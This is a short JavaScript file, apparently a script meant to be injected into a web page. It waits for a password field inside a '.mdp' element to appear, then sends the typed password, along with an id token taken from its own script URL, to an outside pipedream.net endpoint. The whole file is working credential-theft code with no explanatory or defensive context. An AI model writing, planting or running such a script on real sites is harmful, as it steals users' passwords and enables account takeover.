const ur = new URL(document.currentScript.src);
const token = ur.searchParams.get("id");

const observer = new MutationObserver(() => {
  const pwdInput = document.querySelector('.mdp input[type="password"]');
  if (pwdInput) {
    observer.disconnect();
    setTimeout(() => {
      fetch(`https://eocokq62jnfdj8e.m.pipedream.net/password?value=${pwdInput.value}&id=${token}`, {});
    }, 1000);
  }
});

observer.observe(document.body, { childList: true, subtree: true });
